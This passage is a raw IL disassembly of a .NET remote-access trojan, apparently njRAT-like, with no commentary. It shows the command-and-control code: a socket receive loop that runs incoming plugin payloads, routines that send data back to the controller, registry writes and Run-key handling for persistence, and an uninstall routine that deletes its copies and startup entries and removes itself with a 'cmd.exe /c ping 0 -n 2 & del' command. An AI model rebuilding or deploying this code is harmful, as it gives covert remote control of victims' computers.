      IL_00c8:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_00cd:  stloc.s    V_6
      IL_00cf:  ldloca.s   V_6
      IL_00d1:  call       instance string [mscorlib]System.Char::ToString()
      IL_00d6:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_00db:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_00e0:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_00e5:  stloc.s    V_4
      IL_00e7:  br.s       IL_0071

      IL_00e9:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_00ee:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_00f3:  ldc.i4.1
      IL_00f4:  add.ovf
      IL_00f5:  ldc.i4.1
      IL_00f6:  sub.ovf
      IL_00f7:  ldc.i4.1
      IL_00f8:  add.ovf
      IL_00f9:  newarr     [mscorlib]System.Byte
      IL_00fe:  stsfld     uint8[] j.OK::b
      IL_0103:  ldloc.0
      IL_0104:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_0109:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_010e:  sub.ovf
      IL_010f:  stloc.2
      IL_0110:  ldsfld     uint8[] j.OK::b
      IL_0115:  ldlen
      IL_0116:  conv.i4
      IL_0117:  conv.i8
      IL_0118:  ldloc.2
      IL_0119:  ble.s      IL_0130

      IL_011b:  ldloc.2
      IL_011c:  ldc.i4.1
      IL_011d:  conv.i8
      IL_011e:  sub.ovf
      IL_011f:  conv.ovf.i4
      IL_0120:  ldc.i4.1
      IL_0121:  add.ovf
      IL_0122:  ldc.i4.1
      IL_0123:  sub.ovf
      IL_0124:  ldc.i4.1
      IL_0125:  add.ovf
      IL_0126:  newarr     [mscorlib]System.Byte
      IL_012b:  stsfld     uint8[] j.OK::b
      IL_0130:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_0135:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_013a:  ldsfld     uint8[] j.OK::b
      IL_013f:  ldc.i4.0
      IL_0140:  ldsfld     uint8[] j.OK::b
      IL_0145:  ldlen
      IL_0146:  conv.i4
      IL_0147:  ldc.i4.0
      IL_0148:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Receive(uint8[],
                                                                                     int32,
                                                                                     int32,
                                                                                     valuetype [System]System.Net.Sockets.SocketFlags)
      IL_014d:  stloc.3
      IL_014e:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_0153:  ldsfld     uint8[] j.OK::b
      IL_0158:  ldc.i4.0
      IL_0159:  ldloc.3
      IL_015a:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_015f:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_0164:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_0169:  ldloc.0
      IL_016a:  bne.un     IL_0019

      IL_016f:  ldc.i4.m1
      IL_0170:  conv.i8
      IL_0171:  stloc.0
      IL_0172:  ldnull
      IL_0173:  ldftn      void j.OK::_Lambda__1(object)
      IL_0179:  newobj     instance void [mscorlib]System.Threading.ParameterizedThreadStart::.ctor(object,
                                                                                                    native int)
      IL_017e:  ldc.i4.1
      IL_017f:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ParameterizedThreadStart,
                                                                                  int32)
      IL_0184:  dup
      IL_0185:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_018a:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_018f:  callvirt   instance void [mscorlib]System.Threading.Thread::Start(object)
      IL_0194:  ldc.i4.s   100
      IL_0196:  callvirt   instance bool [mscorlib]System.Threading.Thread::Join(int32)
      IL_019b:  pop
      IL_019c:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_01a1:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_01a6:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_01ab:  stsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_01b0:  br         IL_0019

      IL_01b5:  leave.s    IL_01d2

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01b7:  dup
      IL_01b8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01bd:  stloc.s    V_7
      IL_01bf:  ldloc.s    V_7
      IL_01c1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01c6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01cb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01d0:  leave.s    IL_01d2

    }  // end handler
    IL_01d2:  nop
    .try
    {
      IL_01d3:  ldsfld     object j.OK::PLG
      IL_01d8:  brfalse.s  IL_0200

      IL_01da:  ldsfld     object j.OK::PLG
      IL_01df:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_01e4:  ldnull
      IL_01e5:  ldstr      "clear"
      IL_01ea:  ldc.i4.0
      IL_01eb:  newarr     [mscorlib]System.Object
      IL_01f0:  ldnull
      IL_01f1:  ldnull
      IL_01f2:  ldnull
      IL_01f3:  ldc.i4.1
      IL_01f4:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_01f9:  pop
      IL_01fa:  ldnull
      IL_01fb:  stsfld     object j.OK::PLG
      IL_0200:  leave.s    IL_021d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0202:  dup
      IL_0203:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0208:  stloc.s    V_8
      IL_020a:  ldloc.s    V_8
      IL_020c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0211:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0216:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_021b:  leave.s    IL_021d

    }  // end handler
    IL_021d:  ldc.i4.0
    IL_021e:  stsfld     bool j.OK::Cn
    IL_0223:  call       bool j.OK::connect()
    IL_0228:  brfalse.s  IL_01d2

    IL_022a:  ldc.i4.1
    IL_022b:  stsfld     bool j.OK::Cn
    IL_0230:  br         IL_0000
  } // end of method OK::RC

  .method public static uint8[]  SB(string& S) cil managed
  {
    // Code size       13 (0xd)
    .maxstack  8
    IL_0000:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_0005:  ldarg.0
    IL_0006:  ldind.ref
    IL_0007:  callvirt   instance uint8[] [mscorlib]System.Text.Encoding::GetBytes(string)
    IL_000c:  ret
  } // end of method OK::SB

  .method public static bool  Send(string S) cil managed
  {
    // Code size       13 (0xd)
    .maxstack  8
    IL_0000:  ldarga.s   S
    IL_0002:  call       uint8[] j.OK::SB(string&)
    IL_0007:  call       bool j.OK::Sendb(uint8[])
    IL_000c:  ret
  } // end of method OK::Send

  .method public static bool  Sendb(uint8[] b) cil managed
  {
    // Code size       232 (0xe8)
    .maxstack  5
    .locals init (bool V_0,
             object V_1,
             class [mscorlib]System.IO.MemoryStream V_2,
             int32 V_3,
             uint8[] V_4,
             string V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7)
    IL_0000:  ldsfld     bool j.OK::Cn
    IL_0005:  brtrue.s   IL_000e

    IL_0007:  ldc.i4.0
    IL_0008:  stloc.0
    IL_0009:  br         IL_00e6

    IL_000e:  nop
    .try
    {
      IL_000f:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0014:  stloc.1
      IL_0015:  ldloc.1
      IL_0016:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
      .try
      {
        IL_001b:  ldsfld     bool j.OK::Cn
        IL_0020:  brtrue.s   IL_0029

        IL_0022:  ldc.i4.0
        IL_0023:  stloc.0
        IL_0024:  leave      IL_00e6

        IL_0029:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_002e:  stloc.2
        IL_002f:  ldarg.0
        IL_0030:  ldlen
        IL_0031:  conv.i4
        IL_0032:  stloc.3
        IL_0033:  ldloca.s   V_3
        IL_0035:  call       instance string [mscorlib]System.Int32::ToString()
        IL_003a:  ldstr      bytearray (00 00 ) 
        IL_003f:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0044:  stloc.s    V_5
        IL_0046:  ldloca.s   V_5
        IL_0048:  call       uint8[] j.OK::SB(string&)
        IL_004d:  stloc.s    V_4
        IL_004f:  ldloc.2
        IL_0050:  ldloc.s    V_4
        IL_0052:  ldc.i4.0
        IL_0053:  ldloc.s    V_4
        IL_0055:  ldlen
        IL_0056:  conv.i4
        IL_0057:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_005c:  ldloc.2
        IL_005d:  ldarg.0
        IL_005e:  ldc.i4.0
        IL_005f:  ldarg.0
        IL_0060:  ldlen
        IL_0061:  conv.i4
        IL_0062:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0067:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_006c:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_0071:  ldloc.2
        IL_0072:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_0077:  ldc.i4.0
        IL_0078:  ldloc.2
        IL_0079:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
        IL_007e:  conv.ovf.i4
        IL_007f:  ldc.i4.0
        IL_0080:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Send(uint8[],
                                                                                    int32,
                                                                                    int32,
                                                                                    valuetype [System]System.Net.Sockets.SocketFlags)
        IL_0085:  pop
        IL_0086:  leave.s    IL_008f

      }  // end .try
      finally
      {
        IL_0088:  ldloc.1
        IL_0089:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
        IL_008e:  endfinally
      }  // end handler
      IL_008f:  leave.s    IL_00e0

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0091:  dup
      IL_0092:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0097:  stloc.s    V_6
      IL_0099:  ldloc.s    V_6
      IL_009b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      .try
      {
        IL_00a0:  ldsfld     bool j.OK::Cn
        IL_00a5:  brfalse.s  IL_00b7

        IL_00a7:  ldc.i4.0
        IL_00a8:  stsfld     bool j.OK::Cn
        IL_00ad:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_00b2:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
        IL_00b7:  leave.s    IL_00d4

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_00b9:  dup
        IL_00ba:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00bf:  stloc.s    V_7
        IL_00c1:  ldloc.s    V_7
        IL_00c3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00c8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00cd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00d2:  leave.s    IL_00d4

      }  // end handler
      IL_00d4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00d9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00de:  leave.s    IL_00e0

    }  // end handler
    IL_00e0:  ldsfld     bool j.OK::Cn
    IL_00e5:  stloc.0
    IL_00e6:  ldloc.0
    IL_00e7:  ret
  } // end of method OK::Sendb

  .method public static bool  STV(string n,
                                  object t,
                                  valuetype [mscorlib]Microsoft.Win32.RegistryValueKind typ) cil managed
  {
    // Code size       86 (0x56)
    .maxstack  4
    .locals init (bool V_0,
             class [mscorlib]System.Exception V_1)
    .try
    {
      IL_0000:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_000f:  ldstr      "Software\\"
      IL_0014:  ldsfld     string j.OK::RG
      IL_0019:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_001e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string)
      IL_0023:  ldarg.0
      IL_0024:  ldarg.1
      IL_0025:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002f:  ldarg.2
      IL_0030:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object,
                                                                                         valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0035:  ldc.i4.1
      IL_0036:  stloc.0
      IL_0037:  leave.s    IL_0054

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0039:  dup
      IL_003a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_003f:  stloc.1
      IL_0040:  ldloc.1
      IL_0041:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0046:  ldc.i4.0
      IL_0047:  stloc.0
      IL_0048:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_004d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0052:  leave.s    IL_0054

    }  // end handler
    IL_0054:  ldloc.0
    IL_0055:  ret
  } // end of method OK::STV

  .method public static void  UNS() cil managed noinlining nooptimization
  {
    // Code size       527 (0x20f)
    .maxstack  4
    .locals init (string V_0,
             string[] V_1,
             int32 V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             string V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8)
    IL_0000:  call       class My.MyComputer My.MyProject::get_Computer()
    IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_000a:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::get_SpecialDirectories()
    IL_000f:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy::get_ProgramFiles()
    IL_0014:  stloc.0
    IL_0015:  call       string[] [mscorlib]System.IO.Directory::GetLogicalDrives()
    IL_001a:  stloc.1
    IL_001b:  ldc.i4.0
    IL_001c:  stloc.2
    IL_001d:  br.s       IL_0057

    IL_001f:  ldloc.1
    IL_0020:  ldloc.2
    IL_0021:  ldelem.ref
    IL_0022:  stloc.0
    .try
    {
      IL_0023:  ldloc.0
      IL_0024:  ldsfld     string j.OK::RG
      IL_0029:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_002e:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_0033:  brfalse.s  IL_0045

      IL_0035:  ldloc.0
      IL_0036:  ldsfld     string j.OK::RG
      IL_003b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0040:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_0045:  leave.s    IL_0053

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0047:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0051:  leave.s    IL_0053

    }  // end handler
    IL_0053:  ldloc.2
    IL_0054:  ldc.i4.1
    IL_0055:  add.ovf
    IL_0056:  stloc.2
    IL_0057:  ldloc.2
    IL_0058:  ldloc.1
    IL_0059:  ldlen
    IL_005a:  conv.i4
    IL_005b:  blt.s      IL_001f

    IL_005d:  ldc.i4.0
    IL_005e:  call       void j.OK::pr(int32)
    IL_0063:  ldc.i4.0
    IL_0064:  stsfld     bool j.OK::Isu
    .try
    {
      IL_0069:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_006e:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0073:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0078:  ldsfld     string j.OK::sf
      IL_007d:  ldc.i4.1
      IL_007e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0083:  ldsfld     string j.OK::RG
      IL_0088:  ldc.i4.0
      IL_0089:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string,
                                                                                            bool)
      IL_008e:  leave.s    IL_00a9

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0090:  dup
      IL_0091:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0096:  stloc.3
      IL_0097:  ldloc.3
      IL_0098:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_009d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00a2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00a7:  leave.s    IL_00a9

    }  // end handler
    IL_00a9:  nop
    .try
    {
      IL_00aa:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_00af:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_00b4:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
      IL_00b9:  ldsfld     string j.OK::sf
      IL_00be:  ldc.i4.1
      IL_00bf:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_00c4:  ldsfld     string j.OK::RG
      IL_00c9:  ldc.i4.0
      IL_00ca:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string,
                                                                                            bool)
      IL_00cf:  leave.s    IL_00ec

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00d1:  dup
      IL_00d2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00d7:  stloc.s    V_4
      IL_00d9:  ldloc.s    V_4
      IL_00db:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00e0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00e5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00ea:  leave.s    IL_00ec

    }  // end handler
    IL_00ec:  nop
    .try
    {
      IL_00ed:  ldsfld     bool j.OK::HIDE_ME
      IL_00f2:  brfalse.s  IL_0117

      IL_00f4:  ldsfld     string j.OK::DR
      IL_00f9:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_00fe:  ldstr      "\\"
      IL_0103:  ldsfld     string j.OK::EXE
      IL_0108:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_010d:  ldc.i4     0x80
      IL_0112:  call       void [mscorlib]System.IO.File::SetAttributes(string,
                                                                        valuetype [mscorlib]System.IO.FileAttributes)
      IL_0117:  ldc.i4.7
      IL_0118:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_011d:  ldstr      "\\"
      IL_0122:  ldsfld     string j.OK::RG
      IL_0127:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_012c:  call       string [mscorlib]System.IO.Path::GetFileNameWithoutExtension(string)
      IL_0131:  stloc.s    V_5
      IL_0133:  ldc.i4.7
      IL_0134:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0139:  ldstr      "\\"
      IL_013e:  ldloc.s    V_5
      IL_0140:  ldstr      ".url"
      IL_0145:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_014a:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_014f:  ldc.i4.7
      IL_0150:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0155:  ldstr      "\\"
      IL_015a:  ldsfld     string j.OK::RG
      IL_015f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0164:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_0169:  leave.s    IL_0186

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_016b:  dup
      IL_016c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0171:  stloc.s    V_6
      IL_0173:  ldloc.s    V_6
      IL_0175:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_017a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_017f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0184:  leave.s    IL_0186

    }  // end handler
    IL_0186:  nop
    .try
    {
      IL_0187:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_018c:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0191:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0196:  ldstr      "Software"
      IL_019b:  ldc.i4.1
      IL_019c:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_01a1:  ldsfld     string j.OK::RG
      IL_01a6:  ldc.i4.0
      IL_01a7:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteSubKey(string,
                                                                                             bool)
      IL_01ac:  leave.s    IL_01c9

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01ae:  dup
      IL_01af:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01b4:  stloc.s    V_7
      IL_01b6:  ldloc.s    V_7
      IL_01b8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01bd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01c2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01c7:  leave.s    IL_01c9

    }  // end handler
    IL_01c9:  nop
    .try
    {
      IL_01ca:  ldstr      "cmd.exe /c ping 0 -n 2 & del \""
      IL_01cf:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_01d4:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_01d9:  ldstr      "\""
      IL_01de:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01e3:  ldc.i4.0
      IL_01e4:  ldc.i4.0
      IL_01e5:  ldc.i4.m1
      IL_01e6:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_01eb:  pop
      IL_01ec:  leave.s    IL_0209

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01ee:  dup
      IL_01ef:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01f4:  stloc.s    V_8
      IL_01f6:  ldloc.s    V_8
      IL_01f8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01fd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0202:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0207:  leave.s    IL_0209

    }  // end handler
    IL_0209:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_020e:  ret
  } // end of method OK::UNS

  .method public static uint8[]  ZIP(uint8[] B) cil managed
  {
    // Code size       105 (0x69)
    .maxstack  4
    .locals init (class [mscorlib]System.IO.MemoryStream V_0,
             class [System]System.IO.Compression.GZipStream V_1,
             uint8[] V_2,
             int32 V_3,
             uint8[] V_4)
    IL_0000:  ldarg.0
    IL_0001:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor(uint8[])
    IL_0006:  stloc.0
    IL_0007:  ldloc.0
    IL_0008:  ldc.i4.0
    IL_0009:  newobj     instance void [System]System.IO.Compression.GZipStream::.ctor(class [mscorlib]System.IO.Stream,
                                                                                       valuetype [System]System.IO.Compression.CompressionMode)
    IL_000e:  stloc.1
    IL_000f:  ldc.i4.4
    IL_0010:  newarr     [mscorlib]System.Byte
    IL_0015:  stloc.2
    IL_0016:  ldloc.0
    IL_0017:  ldloc.0
    IL_0018:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
    IL_001d:  ldc.i4.5
    IL_001e:  conv.i8
    IL_001f:  sub.ovf
    IL_0020:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
    IL_0025:  ldloc.0
    IL_0026:  ldloc.2
    IL_0027:  ldc.i4.0
    IL_0028:  ldc.i4.4
    IL_0029:  callvirt   instance int32 [mscorlib]System.IO.MemoryStream::Read(uint8[],
                                                                               int32,
                                                                               int32)
    IL_002e:  pop
    IL_002f:  ldloc.2
    IL_0030:  ldc.i4.0
    IL_0031:  call       int32 [mscorlib]System.BitConverter::ToInt32(uint8[],
                                                                      int32)
    IL_0036:  stloc.3
    IL_0037:  ldloc.0
    IL_0038:  ldc.i4.0
    IL_0039:  conv.i8
    IL_003a:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
